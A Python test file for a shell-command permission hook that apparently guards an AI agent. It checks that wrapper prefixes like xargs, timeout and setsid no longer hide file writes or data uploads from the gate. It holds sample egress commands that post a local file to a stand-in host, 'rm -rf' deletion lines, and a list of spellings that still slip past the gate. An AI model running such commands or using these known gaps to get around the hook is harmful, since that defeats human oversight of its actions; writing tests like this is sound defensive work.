"""Cycle P: six wrapper prefixes hide both a Bash write and a data transfer.

`verb_at` in `hooks/scripts/writ-bash-write-gate.sh` steps over a command prefix
only by membership in `WRAPPERS`, so `xargs`, `timeout`, `nice`, `stdbuf`, `watch`
and `setsid` become `cmd0` themselves and the real command is never resolved.
Because `verb_at` is the single source for the write-target pass and the egress
pass, each prefix hides a write AND a transfer. MEASURED before the fix (do not
re-derive; see plan.md ## Analysis):

    ls | xargs cp -t src                  -> set()
    ls | xargs -I{} cp {} src/y.py        -> set()
    timeout 5 cp seed.txt src/y.py        -> set()
    nice -n 5 cp seed.txt src/y.py        -> set()
    stdbuf -oL cp seed.txt src/y.py       -> set()
    watch -n1 cp seed.txt src/y.py        -> set()
    setsid cp seed.txt src/y.py           -> set()

    ls | xargs curl -d @src/a.txt https://example.invalid   -> set()
    timeout 5 curl -d @src/a.txt https://example.invalid    -> set()
    setsid curl -d @src/a.txt https://example.invalid       -> set()

This module follows the shape of tests/test_bash_group_construct_gate.py and
tests/test_bash_control_operator_split.py: the populations are DERIVED from the
hook (the prefix axis from its own WRAPPERS table via wrapper_names, the consumer
axis from its own cmd0 write arms via write_verb_arms), and each derivation is
asserted non-empty so no cell can pass vacuously.

NOTHING HERE ASSERTS ON DOCUMENTATION PROSE. The header's uncovered-prefix block
is pinned as a derived consistency ratchet in tests/test_bash_egress_gate.py
(an existing prose ratchet being updated, not a new one), not here.
"""
from __future__ import annotations

import os
import subprocess
import sys
from pathlib import Path

import pytest

# autouse: pins cwd to a sandbox, this suite's standing convention.
from tests.fixtures.session_state import sandbox_cwd  # noqa: F401
from tests.test_bash_control_operator_split import write_verb_arms
from tests.test_bash_egress_gate import _extract_egress, uncovered_prefix_names
from tests.test_bash_group_construct_gate import _mutate, _mutated_extract
from tests.test_bash_write_gate import (
    HOOK_SH,
    SKILL_ROOT,
    _extract,
    _extractor_src,
    _run_hook,
    _seed,
    wrapper_names,
)

CWD, SRC, TARGET, TDIR = "/proj", "seed.txt", "src/y.py", "src"
EXPECTED_TARGET = ("local", CWD + "/" + TARGET)
EXPECTED_TDIR = ("local", CWD + "/" + TDIR)
EGRESS_HOST = "example.invalid"
EGRESS_CMD = "curl -d @src/a.txt https://example.invalid"

# One spelling per WRAPPERS member. `xargs` gets its natural piped spelling; the six
# new members get the exact spellings measured silent in the plan.
PREFIXES = {
    "command": "command {cmd}",
    "env":     "env FOO=1 {cmd}",
    "exec":    "exec {cmd}",
    "nohup":   "nohup {cmd}",
    "time":    "time {cmd}",
    "sudo":    "sudo {cmd}",
    "doas":    "doas {cmd}",
    "timeout": "timeout 5 {cmd}",
    "nice":    "nice -n 5 {cmd}",
    "stdbuf":  "stdbuf -oL {cmd}",
    "watch":   "watch -n1 {cmd}",
    "setsid":  "setsid {cmd}",
    "xargs":   "ls | xargs {cmd}",
}

CONSUMERS = {
    "redirect":      ("echo x > {t}", EXPECTED_TARGET),
    "append":        ("echo x >> {t}", EXPECTED_TARGET),
    "tee":           ("tee {t}", EXPECTED_TARGET),
    "dd":            ("dd if=/dev/zero of={t}", EXPECTED_TARGET),
    "cp_dest":       ("cp %s {t}" % SRC, EXPECTED_TARGET),
    "mv_dest":       ("mv %s {t}" % SRC, EXPECTED_TARGET),
    "install_dest":  ("install %s {t}" % SRC, EXPECTED_TARGET),
    "cp_target_dir": ("cp -t {d} %s" % SRC, EXPECTED_TDIR),
    "sed_i":         ("sed -i s/a/b/ {t}", EXPECTED_TARGET),
}

MATRIX = [(p, k, ptpl.format(cmd=ktpl.format(t=TARGET, d=TDIR)), expected)
          for p, ptpl in sorted(PREFIXES.items())
          for k, (ktpl, expected) in sorted(CONSUMERS.items())]

EGRESS_MATRIX = [(p, ptpl.format(cmd=EGRESS_CMD)) for p, ptpl in sorted(PREFIXES.items())]

CORRUPTING = ";&|"


# --------------------------------------------------------------------------- #
# 1. the populations, DERIVED from the hook rather than listed here
# --------------------------------------------------------------------------- #
class TestTheMatrixIsDerivedAndComplete:
    """A derivation that silently returned nothing would make every cell below
    vacuous -- this repo's most repeated failure this session."""

    def test_the_derived_populations_are_non_empty(self):
        assert wrapper_names(_extractor_src())
        assert write_verb_arms(_extractor_src())

    def test_matrix_is_not_empty(self):
        assert MATRIX

    def test_egress_matrix_is_not_empty(self):
        assert EGRESS_MATRIX

    def test_matrix_covers_the_full_cross_product(self):
        assert len(MATRIX) == len(PREFIXES) * len(CONSUMERS)

    def test_egress_matrix_covers_every_prefix(self):
        assert len(EGRESS_MATRIX) == len(PREFIXES)

    def test_prefix_axis_equals_the_hooks_own_wrappers_keys(self):
        # A future WRAPPERS entry with no matrix cell reddens HERE rather than
        # shipping uncovered.
        assert set(PREFIXES) == wrapper_names(_extractor_src())

    def test_every_write_verb_arm_appears_in_some_consumer_template(self):
        # Asked as "appears in SOME template", not "is the template's first word":
        # `tee`'s template is `tee {t}` here (unlike the piped form elsewhere), and
        # the correction tests/test_bash_control_operator_split.py:162-175 already
        # documents applies just as much to this matrix's own consumer set.
        arms = write_verb_arms(_extractor_src())
        templates = " ".join(ktpl for ktpl, _e in CONSUMERS.values())
        missing = {a for a in arms if a not in templates}
        assert not missing, f"write verb arms with no matrix cell: {sorted(missing)}"


# --------------------------------------------------------------------------- #
# 2. the matrix itself: every prefix resolves the real verb behind it
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "prefix,consumer,cmd,expected",
    MATRIX,
    ids=["%s-%s" % (p, k) for p, k, _c, _e in MATRIX],
)
def test_matrix_cell_emits_the_clean_row(prefix, consumer, cmd, expected):
    rows = _extract(cmd)
    assert expected in rows, (cmd, rows)
    corrupt = [path for _kind, path in rows if any(ch in path for ch in CORRUPTING)]
    assert not corrupt, (cmd, corrupt)


@pytest.mark.parametrize(
    "prefix,cmd",
    EGRESS_MATRIX,
    ids=[p for p, _c in EGRESS_MATRIX],
)
def test_egress_matrix_cell_emits_the_host(prefix, cmd):
    rows = _extract_egress(cmd)
    assert any(host == EGRESS_HOST for host, _detail in rows), (cmd, rows)


# --------------------------------------------------------------------------- #
# 3. per-prefix flag edge cases: glued value, spaced value, `--`, unknown flag
# --------------------------------------------------------------------------- #
class TestStdbufFlagEdges:
    def test_glued_value_resolves_the_verb(self):
        cmd = "stdbuf -oL cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_unknown_flag_detects_nothing(self):
        cmd = "stdbuf -Q cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == set(), cmd

    def test_unknown_flag_egress_detects_nothing(self):
        cmd = "stdbuf -Q %s" % EGRESS_CMD
        assert _extract_egress(cmd) == set(), cmd

    def test_unknown_flag_still_extracts_a_plain_redirect(self):
        # The bail suppresses VERB-based extraction only; the redirect scan runs
        # over the whole segment regardless (the documented `sudo` precedent).
        cmd = "stdbuf -Q echo x > %s" % TARGET
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd


class TestXargsFlagEdges:
    def test_glued_capture_flag_resolves_the_verb(self):
        cmd = "ls | xargs -I{} cp {} %s" % TARGET
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_glued_max_args_flag_resolves_the_verb(self):
        cmd = "xargs -n1 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_spaced_max_args_flag_resolves_the_verb(self):
        cmd = "xargs -n 1 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_double_dash_resolves_the_verb(self):
        cmd = "xargs -- cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_unknown_flag_detects_nothing(self):
        cmd = "xargs -Z cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == set(), cmd

    def test_unknown_flag_egress_detects_nothing(self):
        cmd = "xargs -Z %s" % EGRESS_CMD
        assert _extract_egress(cmd) == set(), cmd

    def test_disclosed_miss_glued_optional_argument_short_stays_silent(self):
        # `-i` is optional-argument; GNU requires it glued when given. Listing it
        # NOVALUE resolves the common `-i cp ...` spelling but bails on the glued
        # `-iX` spelling (unknown letter after `-i`). Named in the header's
        # uncovered block (asserted in tests/test_bash_egress_gate.py).
        cmd = "xargs -iX cp {} %s" % TARGET
        assert _extract(cmd) == set(), cmd


class TestWatchFlagEdges:
    def test_glued_interval_resolves_the_verb(self):
        cmd = "watch -n1 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_spaced_interval_resolves_the_verb(self):
        cmd = "watch -n 5 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_unknown_flag_detects_nothing(self):
        cmd = "watch --bogus cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == set(), cmd

    def test_unknown_flag_egress_detects_nothing(self):
        cmd = "watch --bogus %s" % EGRESS_CMD
        assert _extract_egress(cmd) == set(), cmd

    def test_disclosed_miss_quoted_command_string_stays_silent(self):
        # The whole quoted command arrives as ONE token; shlex(posix=False) keeps
        # the quote characters, dequote yields the whole string as one name, and no
        # cmd0 arm matches. Named in the header's uncovered block.
        cmd = "watch -n1 'cp %s %s'" % (SRC, TARGET)
        assert _extract(cmd) == set(), cmd


class TestNiceFlagEdges:
    def test_glued_value_resolves_the_verb(self):
        cmd = "nice -n5 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_spaced_value_resolves_the_verb(self):
        cmd = "nice -n 5 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_bare_nice_with_no_flags_resolves_the_verb(self):
        # `nice cp ...` is legal: the flag loop breaks on the first non-dash token
        # and the outer loop resolves it as the verb with no positional step needed.
        cmd = "nice cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_disclosed_miss_obsolete_numeric_flag_stays_silent(self):
        # The obsolete `nice -5 cmd` spelling has `-5` as an unknown option letter,
        # so it bails. Named in the header's uncovered block.
        cmd = "nice -5 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == set(), cmd


class TestSetsidFlagEdges:
    def test_double_dash_resolves_the_verb(self):
        cmd = "setsid -- cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_unknown_flag_detects_nothing(self):
        cmd = "setsid --bogus cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == set(), cmd

    def test_unknown_flag_egress_detects_nothing(self):
        cmd = "setsid --bogus %s" % EGRESS_CMD
        assert _extract_egress(cmd) == set(), cmd

    def test_bare_setsid_resolves_the_verb(self):
        cmd = "setsid cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd


# --------------------------------------------------------------------------- #
# 4. timeout's positional duration
# --------------------------------------------------------------------------- #
class TestTimeoutPositional:
    @pytest.mark.parametrize("cmd", [
        "timeout 5 cp %s %s" % (SRC, TARGET),
        "timeout -s KILL 5 cp %s %s" % (SRC, TARGET),
        "timeout -k 1 5 cp %s %s" % (SRC, TARGET),
        "timeout -- 5 cp %s %s" % (SRC, TARGET),
        "timeout 0.5 cp %s %s" % (SRC, TARGET),
        "timeout 5s cp %s %s" % (SRC, TARGET),
    ])
    def test_the_positional_duration_resolves_in_every_measured_form(self, cmd):
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_a_non_duration_shaped_first_positional_is_treated_as_the_verb(self):
        # A duration-less `timeout cp ...` is a command `timeout` itself would
        # reject, so the fail-closed cost is an extra row for a command that never
        # runs, never a lost row for one that does.
        cmd = "timeout cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd


# --------------------------------------------------------------------------- #
# 5. unchanged controls: sudo / env behavior sharing this code path
# --------------------------------------------------------------------------- #
class TestUnchangedSudoAndEnvControls:
    def test_sudo_write_control_unchanged(self):
        cmd = "sudo cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_env_write_control_unchanged(self):
        cmd = "env FOO=1 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_sudo_spaced_user_flag_control_unchanged(self):
        cmd = "sudo -u deploy cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_sudo_glued_user_flag_control_unchanged(self):
        cmd = "sudo -udeploy cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd


# --------------------------------------------------------------------------- #
# 6. deletion stays out of scope; find -exec stays deferred; the false positive
#    this fix must not introduce stays silent
# --------------------------------------------------------------------------- #
class TestMustStaySilentAfterTheFix:
    def test_find_pipe_xargs_rm_stays_silent(self):
        # Deletion is OUT OF SCOPE for this gate by recorded ruling (the hook's
        # own :359-361: "rm -rf, DROP TABLE and TRUNCATE are OUT OF SCOPE on
        # purpose"). `rm` matches no write arm, so this stays silent after the fix
        # exactly as it was measured before it.
        assert _extract("find . | xargs rm") == set()

    def test_xargs_rm_rf_stays_silent(self):
        assert _extract("ls | xargs rm -rf src") == set()

    def test_timeout_rm_rf_stays_silent(self):
        assert _extract("timeout 5 rm -rf src") == set()

    @pytest.mark.parametrize("cmd", [
        r"find . -name x -exec cp {} src/y.py \;",
        "find . -name x -exec cp {} src/y.py +",
        r"find . -name x -execdir cp {} src/y.py \;",
        "find . -name x -execdir cp {} src/y.py +",
    ])
    def test_all_four_find_exec_spellings_stay_silent(self, cmd):
        # DEFERRED to its own cycle: the nested command sits inside an argument
        # list with a terminator, not in front of the command, so no prefix step
        # can reach it. Pinned so the deferral is visible rather than assumed.
        assert _extract(cmd) == set(), cmd

    def test_no_false_positive_on_this_repos_own_test_command(self):
        # The one false-positive risk the fix could plausibly introduce: `timeout`
        # now resolves `python` as the verb, but inline_form returns "" for a `-m`
        # invocation, so the interpreter-arg scan produces no hits.
        cmd = "timeout 300 .venv/bin/python -m pytest tests/test_bash_write_gate.py"
        assert _extract(cmd) == set(), cmd


# --------------------------------------------------------------------------- #
# 7. one prefix proved at the decision layer, not only the extractor layer
# --------------------------------------------------------------------------- #
class TestFullHookPrefixProof:
    def test_timeout_prefixed_egress_asks_naming_the_host_through_the_real_hook(
        self, tmp_path: Path
    ):
        sid = "wrap-pfx-egress-sid"
        _seed(sid, mode="conversation")
        cmd = "timeout 5 %s" % EGRESS_CMD
        out = _run_hook(cmd, sid, str(tmp_path))
        assert out is not None, "the prefixed egress command was silent"
        assert out.get("permissionDecision") == "ask", out
        assert EGRESS_HOST in out.get("permissionDecisionReason", ""), out


# --------------------------------------------------------------------------- #
# 8. the uncovered-prefix ratchet's own parser, proven against synthetic source
#    (not the real hook's prose) so both directions of the consistency check are
#    shown to redden rather than merely reasoned about.
# --------------------------------------------------------------------------- #
class TestUncoveredPrefixRatchetIsBidirectional:
    def test_the_block_parses_names_only(self):
        src = (
            "# UNCOVERED PREFIXES BEGIN (names only)\n"
            "# find -exec, find -execdir, xargs\n"
            "# UNCOVERED PREFIXES END\n"
        )
        assert uncovered_prefix_names(src) == {"find -exec", "find -execdir", "xargs"}

    def test_a_name_kept_uncovered_after_its_prefix_is_covered_is_an_overlap(self):
        # Proves "closing a prefix without updating the block" actually reddens:
        # `xargs` is both named uncovered AND present in the covered set.
        src = (
            "# UNCOVERED PREFIXES BEGIN\n"
            "# find -exec, xargs\n"
            "# UNCOVERED PREFIXES END\n"
        )
        names = uncovered_prefix_names(src)
        covered = {"xargs", "sudo"}
        overlap = {n for n in names if n.split()[0] in covered}
        assert overlap == {"xargs"}, overlap

    def test_a_genuinely_uncovered_name_produces_no_overlap(self):
        # The healthy case: nothing named uncovered is also a WRAPPERS key.
        src = (
            "# UNCOVERED PREFIXES BEGIN\n"
            "# find -exec, coproc\n"
            "# UNCOVERED PREFIXES END\n"
        )
        names = uncovered_prefix_names(src)
        covered = {"xargs", "sudo"}
        overlap = {n for n in names if n.split()[0] in covered}
        assert not overlap, overlap


# --------------------------------------------------------------------------- #
# 9. the fix is conditional: mutating the mechanism reddens exactly the cells it
#    is load-bearing for, and nothing else. Reuses _mutate / _mutated_extract
#    from tests/test_bash_group_construct_gate.py, which assert the mutation
#    target exists before mutating, so a stale target cannot silently pass.
# --------------------------------------------------------------------------- #
def _mutated_egress(mutated_src: str, cmd: str, cwd: str = CWD) -> set[tuple[str, str]]:
    env = dict(os.environ, WRIT_BASH_CMD=cmd, WRIT_CWD=cwd)
    p = subprocess.run([sys.executable, "-c", mutated_src], env=env,
                       capture_output=True, text=True)
    return {(parts[1], parts[2]) for line in p.stdout.splitlines()
            if len(parts := line.split("\t", 2)) == 3 and parts[0] == "egress"}


class TestTheFixIsConditional:
    def test_removing_the_xargs_wrapper_entry_reddens_its_write_and_egress_cells(self):
        src = _extractor_src()
        mutated = _mutate(src, '"xargs": (', '"xargs_disabled": (')
        assert mutated != src

        write_cmd = "ls | xargs cp %s %s" % (SRC, TARGET)
        got_write = _mutated_extract(mutated, write_cmd)
        assert EXPECTED_TARGET not in got_write, got_write

        egress_cmd = "ls | xargs %s" % EGRESS_CMD
        got_egress = _mutated_egress(mutated, egress_cmd)
        assert not any(h == EGRESS_HOST for h, _d in got_egress), got_egress

    def test_removing_the_timeout_wrapper_entry_reddens_its_write_and_egress_cells(self):
        src = _extractor_src()
        mutated = _mutate(src, '"timeout": (', '"timeout_disabled": (')
        assert mutated != src

        write_cmd = "timeout 5 cp %s %s" % (SRC, TARGET)
        got_write = _mutated_extract(mutated, write_cmd)
        assert EXPECTED_TARGET not in got_write, got_write

        egress_cmd = "timeout 5 %s" % EGRESS_CMD
        got_egress = _mutated_egress(mutated, egress_cmd)
        assert not any(h == EGRESS_HOST for h, _d in got_egress), got_egress

    def test_neutering_wrapper_positionals_reddens_timeout_but_leaves_nice_green(self):
        src = _extractor_src()
        mutated = _mutate(src, "WRAPPER_POSITIONALS.get(name, 0)", "0")
        assert mutated != src

        timeout_cmd = "timeout 5 cp %s %s" % (SRC, TARGET)
        got_timeout = _mutated_extract(mutated, timeout_cmd)
        assert EXPECTED_TARGET not in got_timeout, got_timeout

        nice_cmd = "nice -n 5 cp %s %s" % (SRC, TARGET)
        got_nice = _mutated_extract(mutated, nice_cmd)
        assert EXPECTED_TARGET in got_nice, got_nice

    def test_forcing_the_duration_shape_check_true_reddens_the_non_duration_positional(self):
        src = _extractor_src()
        mutated = _mutate(src, "DURATION.match(dequote(seg[i]))", "True")
        assert mutated != src

        cmd = "timeout cp %s %s" % (SRC, TARGET)
        got = _mutated_extract(mutated, cmd)
        assert EXPECTED_TARGET not in got, got
